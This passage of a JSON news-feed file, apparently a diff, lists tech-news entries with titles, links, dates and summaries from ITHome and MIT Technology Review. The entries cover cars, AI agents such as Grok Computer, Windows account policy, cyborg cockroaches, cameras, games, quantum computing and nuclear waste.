+      "summary": "IT之家 3 月 21 日消息，昨天，比亚迪腾势汽车总经理李慧在微博发起腾势 Z 超跑有奖征名活动。今晚，腾势官方公布活动细节。IT之家附征集时间：即日起至 4 月 10 日命名要求：硬顶版：以纯粹驾趣为原点，铸就核心性能图腾，让顶级赛道科技，成为触手可及的性能信仰敞篷版：自由与情感的延伸，软顶敞篷设计融合阳光、社交与旅途，诠释驰骋于生活之间的诗意格调赛道版：赛道科技的终极形态，凝聚顶级动力、轻量化材质与专属身份认证规则显示，每组包含三款车型不同的后缀名称，与“腾势 Z”组合流畅，易于传播；后缀语言不限（可中文、外文、组合等形式），简洁大气、积极正能量，无负面歧义，对命名配以 50 字以上的创意解读；需为原创作品，未被其他汽车品牌或品类注册使用，不侵犯任何第三方知识产权。该活动由腾势汽车初筛出 30 组，最终结果由网友微博投票选出，如作品出现雷同，以投稿时间先后为准。人气十强投票后，在腾势汽车官方微博进行公示，获奖作品、作者姓名、奖项名称以及获奖作品简介等信息。人气十强：万众瞩目奖（1 名）获得 Insta 360 全景相机 X5高光人气奖（3 名）获得九号电动滑板车 E2 Pro新锐"
+    },
+    {
+      "title": "为“巨硬”铺路：马斯克宣布 Grok Computer 智能体即将上线",
+      "link": "https://www.ithome.com/0/931/344.htm",
+      "published": "Sat, 21 Mar 2026 12:16:33 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，X 平台有用户发现“Grok Computer”即将上线，并推测其将会是“巨硬（Macrohard）的尝鲜版”，预计将以马斯克旗下 AI 平台 Grok 的智能体这一身份登场。随后，马斯克在今天傍晚转发了这则帖子并回应说：“即将推出”。本月早些时候，马斯克透露了一个由特斯拉和 xAI 联合开发的大型新项目，名称正为“数字擎天柱（Digital Optimus）”或“巨硬”。据IT之家了解，马斯克曾表示：“Grok 是总指挥 / 导航者，它深度理解世界，并指挥数字擎天柱去处理和执行过去 5 秒内实时电脑屏幕、键盘与鼠标的操作。Grok 就像是更高级、更智能的逐向导航软件。你可以把它理解为：数字擎天柱 AI 是系统 1（大脑的直觉本能部分），而 Grok 是系统 2（大脑的思考决策部分）。”其核心应用场景包括企业自动化、模拟整个公司运作、处理海量重复性任务，未来还可能与特斯拉 Optimus 机器人形成软硬协同 —— 机器人负责实体工作，“数字擎天柱”负责文书办公类工作。相关阅读：《叫板微软：马斯克官宣数字擎天柱 / Macrohard，可模拟整个公司运作》"
+    },
+    {
+      "title": "我国自主研发的期刊评价体系发布，涵盖医学与生命科学",
+      "link": "https://www.ithome.com/0/931/343.htm",
+      "published": "Sat, 21 Mar 2026 12:12:38 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，今日，我国机构自主研发的期刊评价体系《Dongbi Index 全球高质量期刊列表》的医学与生命科学两大学科的全球高质量期刊列表在上海发布，这也是我国自主研发的期刊评价体系。据“上海科技”公众号介绍，列表由东壁科技数据有限责任公司（简称“东壁科技数据”）联合中国医学科学院医学信息研究所、上海交通大学医学院图书馆发布，从全球超 4 万种期刊中遴选出 4027 本医学、3064 本生命科学优质期刊，构建起多维度、多层次的全新评价标准。IT之家注意到，此次在沪发布的全球高质量医学、生命科学期刊列表，依托东壁科技数据原创的“种子期刊引文追溯 + 引文网络层级结构分级”方法，以权威种子期刊为起点，基于 2023—2025 年全球引文大数据迭代生成，将期刊统一划分为 A、B、C、D 四个等级，为科研人员投稿选刊、学术机构评价、管理部门决策提供权威可靠的参考。这是科技评价领域的重要突破，是上海响应国家战略需求、优化学术生态的务实举措。两大列表全面呈现全球医学与生命科学学术格局。其中，《Dongbi Index 全球高质量期刊列表（医学）》覆盖 40 个子领域，合计近千"
+    },
+    {
+      "title": "改变将从内部出现？微软副总裁汉斯尔曼直言讨厌安装 Win11 强制登录微软账户",
+      "link": "https://www.ithome.com/0/931/342.htm",
+      "published": "Sat, 21 Mar 2026 12:08:58 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，微软日前公布了一系列针对 Windows 11 的重大改动，重点回应用户长期吐槽的问题。这些问题包括系统性能、更新稳定性、AI 功能过多以及广告泛滥等，不一而足。不过整体方向是明确的：提升体验、减少负担。据外媒 Windows Central 今日报道，这次官方行动仍未触及一个最核心的问题：强制登录微软账户。按照目前的设计，用户在首次设置 Windows 11 时，仍然必须联网并登录微软账户，这一流程没有任何改变。而这恰恰是用户最不满的点之一。微软此次官方说明中，甚至完全没有提到这一问题。时间来到现在，这一政策并非完全没有可能松动。微软副总裁斯科特 · 汉斯尔曼在回应讨论时直言：“我也很讨厌这样，正在推进解决。”报道还提到微软内部有多个团队依赖微软账户体系获益，因此是否取消这一要求，涉及多方利益博弈，需要经过内部协调甚至决策流程。目前的状态是 Windows 团队正在评估方案，但还没有明确要推进调整。据IT之家此前报道，微软 Windows 与设备执行副总裁 Pavan Davuluri 昨日（3 月 20 日）发布致 Windows Insider 项"
+    },
+    {
+      "title": "新加坡南洋理工大学研制出“半机械蟑螂”，可用来检测下水道",
+      "link": "https://www.ithome.com/0/931/339.htm",
+      "published": "Sat, 21 Mar 2026 11:45:51 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，在新加坡，基础设施巡检有望不再依赖传统机器人，而是由“半机械蟑螂”完成。当地时间 3 月 19 日，据外媒 TechSpot 报道，南洋理工大学正在推进将原本用于灾害救援的技术转向检测老化管道、地下系统等更日常的应用场景。该项目由南洋理工大学机械与航空航天工程学院教授佐藤宽崇（音译）负责。他曾实现全球首次远程控制甲虫飞行，并被《吉尼斯世界纪录》收录。蟑螂的结构优势使其可以进入狭窄空间，而这是传统机器人难以具备的能力。结合远程控制技术后，昆虫可以在地下管线、下水道等复杂环境中执行检测任务。每只蟑螂背负轻量电子模块，通过微弱电信号进行引导。研究团队表示，这种刺激不会带来痛感。新一代系统降低了约 25% 的电压，从而延长续航。据IT之家了解，团队此前已经进行过实战测试。一年前，研究人员将 10 只改造蟑螂带到缅甸地震现场，用于搜寻幸存者。虽然没有找到生还者，但验证了技术的可行性。目前团队的重点是规模化。通过自动化流程，将控制模块安装到蟑螂身上的时间已经从约 1 小时缩短至 1 分钟左右。新一代原型的设计也发生了变化，从救援用途的背负式设备改为拖拽带轮的小型装置"
+    },
+    {
+      "title": "雷军：小米新一代 SU7 车型 3 月 23 日正式开启交付，将直播首交仪式",
+      "link": "https://www.ithome.com/0/931/338.htm",
+      "published": "Sat, 21 Mar 2026 11:42:25 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，小米创办人、董事长兼 CEO 雷军今晚宣布，小米新一代 SU7 车型 3 月 23 日正式开启交付。3 月 23 日 10 点将直播首交仪式，并回答一些大家关心的问题。着急买车的朋友，小米提前准备了一批准现车，锁单后一到五周交付。新一代 SU7 于 3 月 19 日晚正式发布，延续家族化设计，新增卡布里蓝、赤霞红、靛石绿三款车色。新车全系配备长续航特性，Pro 版 CLTC 续航 902km、Max 版 CLTC 续航 835km、标准版 CLTC 续航 720km。IT之家附各版本售价如下：标准版：21.99 万元Pro 版：24.99 万元Max 版：30.39 万元"
+    },
+    {
+      "title": "苹果 CEO 库克：人工智能是对人能力的放大，而不是对人的取代",
+      "link": "https://www.ithome.com/0/931/336.htm",
+      "published": "Sat, 21 Mar 2026 11:27:09 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，据央视财经今日报道，苹果公司首席执行官蒂姆 · 库克现身北京朝阳某艺术空间，观看了解人工智能等数字化技术在壁画复原等传统文化保护和传承方面的最新应用。库克表示：“现在是一个非常令人兴奋的时代，一切都在飞速变化，而在中国，变化尤其快。我认为，人工智能是你我这一生中最具深远意义的事物之一。在我们看来，人工智能是对人能力的放大，而不是对人的取代。”他补充道：“我认为大家应该放下恐惧，先在日常生活中开始使用它，去思考它能如何帮到你、如何让你更高效、如何帮你分担一部分手头的工作。我们每个人的生活都需要更多快乐，而有些我们正在做的事，并不能带来快乐，或许人工智能可以帮我们把这些事分担下来。”IT之家注意到，库克近期开启新一轮访华之旅。3 月 20 日，商务部部长王文涛会见苹果公司首席执行官蒂姆 · 库克。双方就中美经贸关系、苹果公司在华经营发展等议题进行了交流。库克表示，中国是苹果公司最重要的生产基地、最主要的供应链来源地。苹果公司持续深化在华创新合作、绿色发展与产业链协同，这与中国“十五五”规划方向高度契合。苹果公司希望美中经贸关系保持稳定发展。"
+    },
+    {
+      "title": "全球最大无人货运飞机，白鲸航线 W5000 1:4 缩比实验机成功首飞",
+      "link": "https://www.ithome.com/0/931/335.htm",
+      "published": "Sat, 21 Mar 2026 11:21:19 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，据“微讯江苏”公众号，近日，白鲸航线 W5000 大型货运无人机 1:4 缩比实验机在内蒙古鄂托克前旗成功首飞，标志着该机型全尺寸飞机首飞进入倒计时，国产支线航空货运领域迎来重要突破。IT之家注意到，全球最大的无人货运飞机 W5000 去年 10 月在白鲸航线的常州生产基地成功总装下线。该机型具备 10.8 吨的最大起飞重量、5 吨最大业载能力，航程达到 2600 公里。白鲸航线 W5000 项目自 2021 年启动，专为满足物流需求而设计。W5000 采用传统的涡桨发动机，翼展 22.70 米，垂尾 7.51 米，机长 22.89 米，是国内载重最大、航程最远、整机安全性最高以及货运效率成本最优的大型货运无人机之一。该款飞机采用自主驾驶、地面监控，一个机组可监控 6-7 架飞机，机组人员成本仅为同级别有人飞机的 1/10。W5000 实现了供应链全面自主可控，全机部件都来自国有航空工业体系和民营主流航空企业。W5000 在运营成本及效率方面具备优势，吨公里成本与同级别有人驾驶货运飞机相比可降低 40% 以上，在民航及通航机场的过站时间仅为 15 分钟。"
+    },
+    {
+      "title": "《红色沙漠》市场总监回应游戏“难上手”：像学骑自行车一样需要时间慢慢来",
+      "link": "https://www.ithome.com/0/931/333.htm",
+      "published": "Sat, 21 Mar 2026 10:50:36 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，《红色沙漠》目前最集中的槽点，是操作手感。据外媒 GamesRadar 今日报道，不少玩家认为，这套操作既反直觉又别扭，而且很容易误触，尤其是在刚上手时。开发商 Pearl Abyss 方面则认为，游戏的操作更像“骑自行车”，需要时间适应。而《羞辱》开发负责人迪尼亚 · 巴卡巴则指出，这种非标准操作也有其价值。针对玩家“应该简化操作”的建议，市场总监威尔 · 鲍尔斯说：“可以把它当成骑自行车，学会之后就会变得很自然，只是需要一点时间。”该媒体称，在试玩约三小时后，操作依然不稳定，经常担心按错组合键误伤 NPC。刚解锁“掌力”技能时，就已经把路边的角色打飞过。巴卡巴也谈到了类似设计的意义：“我很喜欢学习一套新的操作方式，这是一种很有成就感的脑力训练，也会改变你理解游戏的方式。我记得玩《恶魔之魂》时，需要重新建立手部协调能力。我希望这种体验不会因为追求标准化而消失。”IT之家从报道中获悉，《恶魔之魂》最初也因为“用肩键进行普通攻击”等操作方式不符合常规而让玩家不适应。然而，随着类魂游戏逐渐走红，这种设计已经被广泛接受。《红色沙漠》是否也会走同样的路径，目前还"
+    },
+    {
+      "title": "又一日本厂商退出舞台，宜丽客宣布全面停产外置蓝光光驱",
+      "link": "https://www.ithome.com/0/931/320.htm",
+      "published": "Sat, 21 Mar 2026 10:20:39 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，当地时间 3 月 17 日，日本外设厂商 Elecom（宜丽客）宣布全面退出蓝光光驱市场。公司决定停产全部 9 款外置 USB 蓝光光驱产品，并计划最晚 2026 年 6 月 30 日结束销售。该公司曾通过细分策略推出多种版本，覆盖不同接口（IT之家注：含 USB-A、USB-C）、不同配色、是否支持 M-Disc 以及不同软件配置，甚至还提供专门面向 Mac 用户的型号。然而这次的动作是一次性全部取消，没有保留任何主力型号，动作相当彻底。蓝光硬件市场整体正在快速收缩。LG 和索尼已经退出部分播放器和刻录机业务，索尼还停止生产可刻录蓝光光盘，对整个产业链产生连锁影响。日本厂商 Buffalo 也作出了类似决定，宣布退出蓝光光驱市场。不过公司随后强调，仍会继续向美国市场供应光驱产品。目前其外置蓝光光驱仍在销售，价格约 99 美元（现汇率约合 683.4 元人民币）起。蓝光技术自 2006 年进入消费市场以来，已经走过 20 年。尽管流媒体已经成为主流，但蓝光仍然是收藏实体影音内容的重要形式，尤其对追求高画质的用户来说，依然具有吸引力。"
+    },
+    {
+      "title": "首款国产全画幅自动对焦变焦镜头亮相：24-50mm f/2.8 规格，东正光学叙光学打造",
+      "link": "https://www.ithome.com/0/931/319.htm",
+      "published": "Sat, 21 Mar 2026 10:03:42 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，据消息源 @独立摄影师 今日透露，首款国产全画幅自动对焦变焦镜头现已展出。据介绍，这款镜头由东正光学叙光学打造，是该品牌的首支自动对焦镜头，规格为 24-50mm f/2.8，适配索尼 E 卡口。消息源对此表示，该镜头有着不错的表现，对焦追焦迅速，画质表现满意。不过具体发布时间暂未公布。据IT之家此前援引科技饭相机情报消息，某中国镜头品牌将在今年第二季度推出一款支持自动对焦的全画幅变焦镜头，将采用恒定光圈设计，变焦时光圈大小不会改变，并且该品牌此前从未发布过自动对焦镜头。"
+    },
+    {
+      "title": "小米智能香氛机套装闻献调香版开售：469 元，三种香味",
+      "link": "https://www.ithome.com/0/931/316.htm",
+      "published": "Sat, 21 Mar 2026 10:02:03 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，小米汽车今日宣布，米家联合中国高端香氛品牌「闻献 DOCUMENTS」特别定制推出智能香氛机套装-闻献调香版，售价 469 元，现已在小米汽车 App 商城开售，共有三种香味：冷杉之息，花木之间，雪松雾境。套装内包含：智能香氛机 x 1米家 | 闻献联名香氛 x 4IT之家注意到，新发布的香氛机替换芯（闻献调香版）和香氛机套装（闻献调香版），可以在第一代 SU7 /SU7 Ultra / YU7 上使用，但是软件适配需要升级到新的版本，具体情况如下：第二代 SU7，且购买了新款香氛机套装（闻献调香版），可以直接使用全功能；第二代 SU7，但使用老款香氛机，需要将香氛机升级到最新的固件版本（版本号为 0092），升级后才能识别新的闻献调香版的香氛棒。新的固件版本会在 4 月初全量推送；第一代 SU7/SU7 Ultra / YU7，但购买了新款的香氛机套装（闻献调香版），可以正常出香，但车机系统功能（比如卡片页快捷操作、超级任务、插入香氛提醒等）需要等待后续车机版本 ota，才能正常使用；第一代 SU7/SU7 Ultra / YU7，且用的是老款香氛机，"
+    },
+    {
+      "title": "欧加系已备案新品曝光：OPPO Find X9 Ultra/X9s Pro 手机、Pad mini 小平板等在路上",
+      "link": "https://www.ithome.com/0/931/312.htm",
+      "published": "Sat, 21 Mar 2026 09:50:54 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，博主 @数码闲聊站 今天在微博透露，欧加系目前已备案新品有 OPPO Find X9 Ultra 影像旗舰手机、Find X9s Pro 小屏旗舰、K15 Pro 系列风扇中端机以及 Pad5 Pro 巨屏性能平板、Pad mini 小屏全能平板、Watch X3 mini 手表、Enco Chip2（原文如此，推测为 Clip2）开放式耳机等。同时，一加这边也在备案同款巨屏性能平板 + 全能小平板，手机则是 Ace 6 至尊版。作为参考，OPPO 本月中旬推出了 Find N6 折叠屏手机，号称“全球最平整折叠屏手机”，搭载第五代骁龙 8 至尊版处理器（2 个超大核 +5 个性能核）、内置 6000mAh 冰川电池，首搭丹霞色彩还原镜头 + 哈苏 2 亿四摄影像，售价 9999 元起。据IT之家此前援引博主消息，OPPO K15 Pro 手机的真机外观照片现已曝光，全系标配直屏 + 金属中框 +5000 万像素双摄矩阵后摄模组 + 内置风扇，高配将搭载天玑 9500s 芯片、6.78\"1.5K LTPS 超高刷直屏，标配工程机则是天玑 8500，定位性"
+    },
+    {
+      "title": "网易《逆水寒》手游 3.3.2 全新造梦版本概念前瞻发布，4 月 3 日上线",
+      "link": "https://www.ithome.com/0/931/311.htm",
+      "published": "Sat, 21 Mar 2026 09:37:39 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，网易《逆水寒》手游今日官宣，3.3.2 造梦版本将于 4 月 3 日上线。官方还发布了新版本概念前瞻。在全新造梦版本中，游戏将迎来多项春日趣味交互，包括画鬼脸、送簪花，还有春日新江湖任务、全新 AI 造梦模式、全新时装设计大赛、全新华章剧情、全新寻境剧情。新版本中，寒棋杯 · 逆水侠棋官方赛 &amp; 寒峰杯 · 首领竞速平台赛双赛全面打响，以及多项福利内容、外观配饰等。IT之家附官方介绍图如下：此外，4 月 3 日造梦版本上线后，燃心画境等副本将开启新的挑战难度，瀚海夺珍等玩法也将迎来更新。"
+    },
+    {
+      "title": "佳能 EOS R7 Mark II 无反相机规格曝光：40FPS 连拍，SD / CFE Type-B 双卡槽设计",
+      "link": "https://www.ithome.com/0/931/310.htm",
+      "published": "Sat, 21 Mar 2026 09:32:43 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，消息源 Canon Rumors 昨天发布博文，对佳能 EOS R7 Mark II 无反相机的传闻规格进行汇总。IT之家附该机曝光参数如下：3900 万像素背照式堆栈传感器读出速度接近或超越佳能 EOS R5 Mark II搭载 DIGIC Accelerator 加速处理器，可用于实现更高读出速度电子快门连拍速度可达 40 FPS支持预拍摄机身操控接近 EOS R6 Mark III双卡槽设计（SD+CF Express Type-B）LP-E6P 电池首发价格明显高于 R7 一代预计 5 月下旬-6 月上旬发布从目前信息来看，当前这些规格大多属于合理升级，并且很可能会与佳能全画幅机型产生一定功能重叠。不过这台相机很可能还会有一到两个意外亮点。"
+    },
+    {
+      "title": "新款奥迪 Q4 e-Tron 实车现身：外观小改款，技术将迎“大升级”",
+      "link": "https://www.ithome.com/0/931/309.htm",
+      "published": "Sat, 21 Mar 2026 09:30:41 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，今天上午，外媒 Carscoops 公布了一组改款奥迪 Q4 e-tron 的实车图。新车已近发布阶段，测试车几乎不再伪装。从细节来看，新车将采用封闭式前脸，内部加入新的波纹状纹理，同时外圈轮廓更突出，前保险杠也进行了小幅调整。下部进气区域换上新的蜂窝状结构，两侧气帘设计也有所更新。前大灯整体造型与现款相似，薄伪装下可能隐藏细节调整。车身侧面没有明显变化，预计会提供新的轮圈样式。车尾部分则更值得注意，后保险杠设计更加统一，取消了此前类似“假通风口”的装饰元素。尾部两侧加入新的开口结构，并配有三角形装饰细节，下方扩散器也经过重新设计。同时，尾灯区域的伪装暗示其内部灯组结构将有所更新。新车内饰此次暂未曝光。此前信息显示，新车将采用全新中控布局，并配备独立式曲面屏设计，整体风格向奥迪最新车型看齐，该媒体预计将提供 11.9 英寸液晶仪表、14.5 英寸中控屏，以及 10.9 英寸副驾驶显示屏。相比现款的 10.25 英寸仪表和 11.6 英寸中控屏，这一变动将是明显升级。同时，新车预计将换装新方向盘，并对按键布局进行调整。动力系统仍是最大悬念，不过可以预期会升"
+    },
+    {
+      "title": "理想汽车汤靖：L9 Livis 的 800V 全主动悬架是一套完整系统，不是某一个供应商提供",
+      "link": "https://www.ithome.com/0/931/308.htm",
+      "published": "Sat, 21 Mar 2026 09:24:11 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，今日，理想汽车产品线负责人汤靖回应了“L9 Livis 的 800V 全主动悬架供应商是谁”。他表示：“这个问题，仔细一想，还真回答不了。不仅仅是因为保密，更是因为 800V 全主动悬架是一套完整系统，不是某一个供应商提供的。”他透露，这一套完整的 800V 全主动悬架，包含空气弹簧、双阀 CDC 主动减震器、四个独立液压泵、高压管路，以及对整个系统的控制和调校。通常行业的做法，是找一家 Tier 1 总成供应商来整合，就像装修房子找总包一样，由它来统筹各个 Tier 2 分包商，完成整体交付。就像车上的座椅，里面有气囊、安全带、按摩模块，就会有一家座椅供应商当总包，再去找各个二级供应商，最终总成供货。但这次，理想找不到这样的 Tier 1。他解释道：“这一套 800V 全主动悬架难度非常大，国内没有现成的方案，更没有现成的供应链 —— 这是中国企业第一次做。没有任何一家供应商，能同时提供空气弹簧、双阀 CDC 主动减震器和液压泵这三项核心部件。行业里根本没有这样的角色。”据IT之家今年 2 月报道，全新一代理想 L9 公布 Livis 终极版，售价 5"
+    },
+    {
+      "title": "CDPR 确认《巫师 3》DLC 将采用长期营销策略，而非突袭发售",
+      "link": "https://www.ithome.com/0/931/306.htm",
+      "published": "Sat, 21 Mar 2026 09:14:34 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，据游戏媒体 EuroGamer 昨天报道，CD Projekt Red 首席执行官 Michał Nowakowski 最近在财报电话会议中表示，《巫师 3》DLC 大概率不会采用突袭式发售的形式上线。据报道，有投资者在会议中询问：“你们何时启动今年新游戏内容的营销工作？是会进行数周或数月的长期营销，还是可能突然上线？”。Michał Nowakowski 对此表示：“我想说，一切皆有可能。但根据往期经验以及我们制作游戏的调性，我们更倾向于长期营销行动，这通常比在某个发布会或活动中突然上线效果更好”。CDPR 首席财务官 Piotr Nielubowicz 也在会议中表示，公司计划推出“新内容”，他对此解释道：“我们相信，凭借着旧作依旧强劲的销售表现以及计划推出的新内容，我们有希望达成激励计划目标”。据悉，所谓“激励计划”也是《巫师 3》DLC 传闻的重要来源。简单说这是一个财务目标，如果达成 CDPR 将获得奖金，但公司目前只完成 74% 进度，仍需在今年赚取 5.27 亿兹罗提（IT之家注：现汇率合人民币 984244441.82 元），因此很可能需"
+    },
+    {
+      "title": "广汽高域飞行汽车 GOVY AirCab 在广州海心沙首飞，年底量产交付",
+      "link": "https://www.ithome.com/0/931/305.htm",
+      "published": "Sat, 21 Mar 2026 08:59:10 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，3 月 20 日，广汽集团孵化的高域科技首款量产型多旋翼飞行汽车 GOVY AirCab 在广州地标海心沙完成了核心区域首次场景飞行演示。据介绍，GOVY AirCab 已通过飞鸟撞击、应急着陆、高低温环境测试等一系列试验。广州工厂将于 5 月实现首台机下线，目前已斩获超 2000 架意向订单。GOVY AirCab 已进入全面适航取证阶段，预计 2026 年底完成适航认证并启动量产交付。去年 6 月，广汽高域在香港正式发布 GOVY AirCab 飞行汽车。该产品官方指导价不超过 168 万元，机身大范围采用航空级碳纤维复合材料，机身结构碳纤维使用率超过 90%，可减轻超 30% 重量，应用场景主要面向低空游览的文旅出行。其采用顶置旋翼和鸥翼门，支持 25 分钟快充，15 分钟内可将电量从 50% 充到 100%。据IT之家了解，GOVY AirCab 提供 2 座布局，座舱内置 5G 网络、智能助手、香氛等功能，安全上支持冗余飞控导航系统、系统全程监控、云端自检等。该飞行汽车支持 L4 级智能驾驶，算力＞500tops，最大探测距离超过 300 米。"
+    },
+    {
+      "title": "马斯克 xAI 为抢夺客户祭出激进打法：直接派工程师上门部署",
+      "link": "https://www.ithome.com/0/931/304.htm",
+      "published": "Sat, 21 Mar 2026 08:55:12 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，昨天晚间，据彭博社报道，为从 OpenAI 和 Anthropic 手中争夺企业客户，马斯克旗下 xAI 开始采取更激进的打法 —— 直接把工程师派到客户办公室，推动产品落地。这一“上门部署”策略已经带来成效。支付公司 Shift4 在引入 xAI 团队后，决定逐步停止使用 ChatGPT，转而采用 Grok。Shift4 CEO 泰勒 · 劳伯表示，公司仍会继续使用 Anthropic 的 Claude 处理编程相关任务。xAI 的做法反映出 AI 行业的一个趋势：各家公司正在通过更深入的技术支持，争取企业客户。OpenAI 和 Anthropic 也在派遣工程师协助客户部署产品，而 OpenAI 甚至与私募基金合作，打造专门的落地团队。过去三年，xAI 的客户主要来自特斯拉、SpaceX 等马斯克生态以及部分政府机构。经历年初的一系列动荡后，公司正在调整战略，具体包括与 SpaceX 整合、创始团队大量离职，以及 Grok 生成不当内容引发的争议。IT之家从报道中获悉，劳伯表示，xAI 目前正重点拓展客服自动化等企业场景。双方在 2025 年末开始合"
+    },
+    {
+      "title": "南航通报：CZ3554 航班起飞后遭遇鸟击，已安全返航",
+      "link": "https://www.ithome.com/0/931/303.htm",
+      "published": "Sat, 21 Mar 2026 08:51:26 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，今日，中国南方航空发布情况通报：今日中午，公司 CZ3554 航班（上海虹桥-深圳）起飞后遭遇鸟击。机组严格按程序处置，航班已安全返航上海虹桥国际机场。公司立即启动预案，做好旅客服务保障，迅速调派另一架飞机执飞该航班。我们对于由此给旅客带来的不便表示歉意。公司始终将旅客安全放在首要位置，感谢旅客的理解与支持。公开资料显示，鸟击（Bird Strike），指飞行中的航空器与鸟类发生碰撞的事件，涵盖飞鸟撞击机身、被吸入发动机等所有接触情形。全球每年超 2 万起鸟击事件，约 90% 发生在机场及周边 300 米以下空域（IT之家注：起降阶段）。"
+    },
+    {
+      "title": "幸狐推出 Lume 系列开发板：全志 T153 芯片、双千兆以太网口，129 元起",
+      "link": "https://www.ithome.com/0/931/302.htm",
+      "published": "Sat, 21 Mar 2026 08:48:40 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 21 日消息，幸狐最近推出 Lume 系列开发板，搭载全志 T153 芯片，适合用于物联网等场景。据介绍，这款产品的处理器采用多核异构设计，搭载 4 个 Cortex-A7 核心、1 个 RISC-V E907 核心，具备 128MB DDR3 内存，提供一排 40 针 GPIO 引脚，可连接外部传感器和执行器，不过并没有配备 HDMI 接口。规格方面，这款产品可以通过 MIPI DSI 4-lane 接口连接屏幕、通过 CSI 接口连接摄像头，提供两个 USB（Type-C+Type-A）接口，规格均为 USB 2.0。值得注意的是，这款设备提供双千兆以太网接口，官方还提供 PoE 模块套餐，使设备可以通过网线同时完成供电与数据传输，从而减少布线需求，具备 microSD 卡槽，可用于安装操作系统等。IT之家附该产品详细参数如下：目前该产品已在天猫开售，标准版售价 129 元，PoE 模块套餐售价 159 元。淘宝幸狐 Lume Linux 开发板 129 元直达链接"
+    },
+    {
+      "title": "The Download: OpenAI is building a fully automated researcher, and a psychedelic trial blind spot",
+      "link": "https://www.technologyreview.com/2026/03/20/1134448/the-download-openai-building-fully-automated-researcher-psychedelic-drug-trial/",
+      "published": "Fri, 20 Mar 2026 13:15:45 +0000",
+      "source": "MIT Technology Review",
+      "summary": "This is today&#8217;s edition of The Download, our weekday newsletter that provides a daily dose of what&#8217;s going on in the world of technology. OpenAI is throwing everything into building a fully automated researcher&#160; OpenAI has a new grand challenge: building an AI researcher—a fully automated agent-based system capable of tackling large, complex problems by&#8230;"
+    },
+    {
+      "title": "OpenAI is throwing everything into building a fully automated researcher",
+      "link": "https://www.technologyreview.com/2026/03/20/1134438/openai-is-throwing-everything-into-building-a-fully-automated-researcher/",
+      "published": "Fri, 20 Mar 2026 11:57:16 +0000",
+      "source": "MIT Technology Review",
+      "summary": "OpenAI is refocusing its research efforts and throwing its resources into a new grand challenge. The San Francisco firm has set its sights on building what it calls an AI researcher, a fully automated agent-based system that will be able to go off and tackle large, complex problems by itself. ​​OpenAI says that this new&#8230;"
+    },
+    {
+      "title": "Mind-altering substances are (still) falling short in clinical trials",
+      "link": "https://www.technologyreview.com/2026/03/20/1134419/psychedelics-overhyped-psilocybin-depression-placebo/",
+      "published": "Fri, 20 Mar 2026 09:00:00 +0000",
+      "source": "MIT Technology Review",
+      "summary": "This week I want to look at where we are with psychedelics, the mind-altering substances that have somehow made the leap from counterculture to major focus of clinical research. Compounds like psilocybin—which is found in magic mushrooms—are being explored for all sorts of health applications, including treatments for depression, PTSD, addiction, and even obesity. Over&#8230;"
+    },
+    {
+      "title": "The Download: Quantum computing for health, and why the world doesn’t recycle more nuclear waste",
+      "link": "https://www.technologyreview.com/2026/03/19/1134413/the-download-quantum-computing-health-recycling-nuclear-waste/",
+      "published": "Thu, 19 Mar 2026 12:17:02 +0000",
+      "source": "MIT Technology Review",
+      "summary": "This is today&#8217;s edition of The Download, our weekday newsletter that provides a daily dose of what&#8217;s going on in the world of technology. A $5 million prize awaits proof that quantum computers can solve health care problems&#160; In a laboratory on the outskirts of Oxford, a quantum computer built from atoms and light awaits&#8230;"
+    },
+    {
+      "title": "Can quantum computers now solve health care problems? We’ll soon find out.",
+      "link": "https://www.technologyreview.com/2026/03/19/1134409/a-5-million-prize-awaits-proof-that-quantum-computers-can-solve-health-care-problems/",
+      "published": "Thu, 19 Mar 2026 10:51:43 +0000",
+      "source": "MIT Technology Review",
+      "summary": "I’m standing in front of a quantum computer built out of atoms and light at the UK’s National Quantum Computing Centre on the outskirts of Oxford. On a laboratory table, a complex matrix of mirrors and lenses surrounds a Rubik’s Cube–size cell where 100 cesium atoms are suspended in grid formation by a carefully manipulated&#8230;"
+    },
+    {
+      "title": "Why the world doesn’t recycle more nuclear waste",
+      "link": "https://www.technologyreview.com/2026/03/19/1134399/nuclear-waste-reprocessing/",
+      "published": "Thu, 19 Mar 2026 10:00:00 +0000",
+      "source": "MIT Technology Review",
+      "summary": "The prospect of making trash useful is always fascinating to me. Whether it’s used batteries, solar panels, or spent nuclear fuel, getting use out of something destined for disposal sounds like a win all around. In nuclear energy, figuring out what to do with waste has always been a challenge, since the material needs to&#8230;"
+    },
+    {
+      "title": "The Download: The Pentagon’s new AI plans, and next-gen nuclear reactors",
+      "link": "https://www.technologyreview.com/2026/03/18/1134371/the-download-the-pentagons-new-ai-plans-and-next-gen-nuclear-reactors/",
+      "published": "Wed, 18 Mar 2026 12:38:00 +0000",
+      "source": "MIT Technology Review",
+      "summary": "This is today&#8217;s edition of The Download, our weekday newsletter that provides a daily dose of what&#8217;s going on in the world of technology. The Pentagon is planning for AI companies to train on classified data,&#160;defense&#160;official says&#160; The Pentagon plans to set up secure environments for generative AI companies to train military-specific versions of their&#8230;"
+    },
+    {
+      "title": "What do new nuclear reactors mean for waste?",
